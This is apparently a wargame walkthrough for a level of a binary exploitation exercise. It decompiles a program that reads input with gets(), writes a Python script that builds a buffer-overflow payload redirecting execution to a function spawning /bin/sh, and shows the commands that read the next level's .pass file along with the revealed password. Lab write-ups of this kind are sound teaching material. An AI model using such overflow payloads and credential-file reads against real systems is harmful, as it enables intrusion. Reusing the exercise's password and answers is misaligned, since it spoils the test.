# Level 01 Walkthrough

## Binary analysis

Decompiling shows the program uses `gets()` to read user input into a 0x40 (64 bytes) buffer, but does not check the length. The function `run()` prints a message and calls `system("/bin/sh")`.

main:
```
08048480    int32_t main(int32_t argc, char** argv, char** envp)
08048496        char buf[0x40]
08048496        return gets(&buf)
```

run:
```
08048444    int32_t run()
0804846d        fwrite(buf: "Good... Wait what?\n", size: 1, count: 0x13, fp: stdout)
0804847f        return system(line: "/bin/sh")
```

## Exploitation

The program is vulnerable to a classic buffer overflow. We can overwrite the return address to call `run()`.

Python script to generate the payload:
```python
padding = b"A" * 76
payload = b"\x44\x84\x04\x08"  # Address of run()
chunk = padding + payload
with open('payload.txt', 'wb') as f:
    f.write(chunk)
```

## Commands used

```
cat /tmp/payload.txt - | ./level1
ls
cat /home/user/level2/.pass
```

## Result

After running the exploit, we get a shell as level2 and can read the password:

```
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Copy the password for the next level. 